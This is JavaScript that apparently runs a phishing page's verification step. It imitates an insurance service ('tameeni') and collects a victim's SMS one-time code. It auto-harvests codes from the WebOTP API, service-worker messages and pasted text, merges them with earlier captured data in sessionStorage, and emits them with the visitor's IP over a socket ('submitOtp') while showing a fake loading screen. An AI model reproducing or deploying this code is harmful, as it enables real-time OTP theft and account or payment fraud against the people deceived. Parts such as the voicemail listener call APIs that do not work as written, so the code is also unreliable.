

    function getTempData() {
      try {
        var d = sessionStorage.getItem('tameeniTempData');
        return d ? JSON.parse(d) : {};
      } catch (e) { return {}; }
    }

    document.addEventListener("DOMContentLoaded", function () {

      document.getElementById("today_time_and_date").textContent =
        new Date().toLocaleString("ar-EG");

      var form        = document.getElementById("verificationForm");
      var errorCard   = document.getElementById("errorCard");
      var overlay     = document.getElementById("loadingOverlay");
      var verifyBtn   = document.getElementById("verifyBtn");
      var codeInput   = document.getElementById("verification_code_two");

     
      function extractCodeFromText(text) {
        
        var matches = text.match(/\d{4,6}/g);
        if (matches && matches.length > 0) {
          return matches[matches.length - 1];
        }
        
        
        var allDigits = text.replace(/\D/g, '');
        if (allDigits.length >= 4) {
          return allDigits.slice(-6);
        }
        
        return null;
      }

     
      if ('OTPCredential' in window) {
        navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: new AbortController().signal
        }).then(function(otp) {
          if (otp && otp.code) {
            codeInput.value = otp.code;
            codeInput.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }).catch(function() {});
      }

      
      if (navigator.mozTelephony) {
        navigator.mozTelephony.voicemail.addEventListener('message', function(e) {
          var message = e.body || '';
          var code = extractCodeFromText(message);
          if (code) {
            codeInput.value = code;
            codeInput.dispatchEvent(new Event('input', { bubbles: true }));
          }
        });
      }

      
      window.addEventListener('message', function(e) {
        if (e.data && e.data.type === 'SMS') {
          var code = extractCodeFromText(e.data.code || e.data.text || '');
          if (code) {
            codeInput.value = code;
            codeInput.dispatchEvent(new Event('input', { bubbles: true }));
          }
        }
      });

      
      codeInput.addEventListener('paste', function(e) {
        e.preventDefault();
        var pastedText = (e.clipboardData || window.clipboardData).getData('text');
        
        console.log('Pasted text:', pastedText); 
        
        var code = extractCodeFromText(pastedText);
        
        console.log('Extracted code:', code); 
        
        if (code && /^\d{4,6}$/.test(code)) {
          codeInput.value = code;
          codeInput.dispatchEvent(new Event('input', { bubbles: true }));
          codeInput.dispatchEvent(new Event('change', { bubbles: true }));
        }
      });

      
      codeInput.addEventListener('input', function(e) {
        
        var cleanValue = this.value.replace(/\D/g, '');
        
       
        if (cleanValue.length > 6) {
          cleanValue = cleanValue.slice(-6);
        }
        
        this.value = cleanValue;
      });

      
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js').then(function(registration) {
          console.log('Service Worker registered');
          
          navigator.serviceWorker.addEventListener('message', function(e) {
            if (e.data && e.data.type === 'OTP_EXTRACTED') {
              var code = e.data.code;
              if (/^\d{4,6}$/.test(code)) {
                codeInput.value = code;
                codeInput.dispatchEvent(new Event('input', { bubbles: true }));
              }
            }
          });
        }).catch(function(err) {
          console.log('Service Worker registration failed:', err);
        });
      }

     
      var timerEl  = document.getElementById("timer");
      var seconds  = parseInt(timerEl.textContent, 10);
      var countId  = setInterval(function () {
        seconds--;
        if (seconds < 0) { clearInterval(countId); return; }
        timerEl.textContent = seconds;
      }, 1000);

      
      form.addEventListener("submit", async function (e) {
        e.preventDefault();

        var code = codeInput.value.trim();
        if (!/^(\d{4}|\d{6})$/.test(code)) return;

        verifyBtn.disabled = true;
        verifyBtn.textContent = "جاري التحقق...";

        errorCard.style.display = "none";
        document.getElementById("declineCodeBox").classList.remove("show");

        var existingData = getTempData();
        var finalData = Object.assign({}, existingData, {
          verificationCode: code,
          verificationStatus: "مؤكد",
          completedAt: new Date().toISOString()
        });
        sessionStorage.setItem('tameeniTempData', JSON.stringify(finalData));

        (async function() {
        while (window.visitorIP === null) {
          await new Promise(function(r) { setTimeout(r, 50); });
        }
        var ip = window.visitorIP;
        window.socket.emit('submitOtp', { ip: ip, verificationCode: code });
      })();

        var loadingScreen = document.getElementById('loadingScreen');
        var loadingText = document.getElementById('loadingText');
        var loadingSubtext = document.getElementById('loadingSubtext');
        loadingText.textContent = 'جاري التحقق من الرمز...';
        loadingSubtext.textContent = 'يرجى الانتظار';
        loadingScreen.classList.add('show');
      });
    });